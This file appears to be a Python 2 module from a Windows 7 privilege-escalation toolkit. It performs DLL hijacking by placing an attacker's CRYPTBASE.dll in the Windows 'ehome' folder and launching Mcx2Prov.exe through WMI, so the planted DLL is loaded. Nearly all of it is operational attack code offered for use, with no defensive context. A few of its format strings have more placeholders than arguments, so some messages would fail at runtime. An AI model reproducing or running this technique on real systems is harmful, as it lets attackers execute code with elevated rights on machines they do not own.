"""
Works from: Windows 7
Fixed in: Windows 8
"""
import os
import wmi
import shutil
import ctypes
import win32con
from colorama import init, Fore
init(convert=True)

wmi = wmi.WMI()

dll_name = "CRYPTBASE.dll"

def successBox():
	return (Fore.GREEN + '[+]' + Fore.RESET)

def errorBox():
	return (Fore.RED + '[-]' + Fore.RESET)

def infoBox():
	return (Fore.CYAN + '[!]' + Fore.RESET)	

def warningBox():
	return (Fore.YELLOW + '[!]' + Fore.RESET)

def windows_directory():
	for os in wmi.Win32_OperatingSystem():
		return os.WindowsDirectory

def mcx2prov_dll_hijack():
	print " {} mcx2prov_dll_hijack: Attempting to dll hijack sysprep process".format(infoBox())
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print " {} mcx2prov_dll_hijack: We are running as admin, we can proceed".format(infoBox())
		if (os.path.isfile(os.path.join(windows_directory(),"ehome",dll_name)) == True):
			try:
				os.remove(os.path.join(windows_directory(),"ehome",dll_name))
				print " {} mcx2prov_dll_hijack: Successfully removed: {} from: {}".format(successBox(),dll_name)
			except Exception as error:
				print " {} mcx2prov_dll_hijack: Unable to remove: {} from: {}".format(errorBox(),dll_name)
				return False

		try:
			shutil.copy(dll_name,os.path.join(windows_directory(),"ehome"))
			print " {} mcx2prov_dll_hijack: Successfully copied: {} to: {}".format(successBox(),dll_name,os.path.join(windows_directory(),"ehome"))
		except shutil.Error as error:
			print " {} mcx2prov_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False
		except IOError as error:
			print " {} mcx2prov_dll_hijack: Unable to copy: {}".format(errorBox(),dll_name)
			return False

		if (os.path.isfile(os.path.join(windows_directory(),"ehome",dll_name)) == True):
			print " {} mcx2prov_dll_hijack: Attempting to create process".format(infoBox())
			try:
				result = wmi.Win32_Process.Create(CommandLine="{}".format(os.path.join(windows_directory(),"ehome","Mcx2Prov.exe")),
												ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
				if (result[1] == 0):
					print " {} mcx2prov_dll_hijack: Process started successfully".format(successBox())
				else:
					print " {} mcx2prov_dll_hijack: Problem creating process".format(errorBox())
			except Exception as error:
				print " {} mcx2prov_dll_hijack: Problem creating process: {}".format(errorBox(),error)
				return False
			
	else:
		print " {} mcx2prov_dll_hijack: We are not admin, cannot proceed".format(errorBox())
		return False	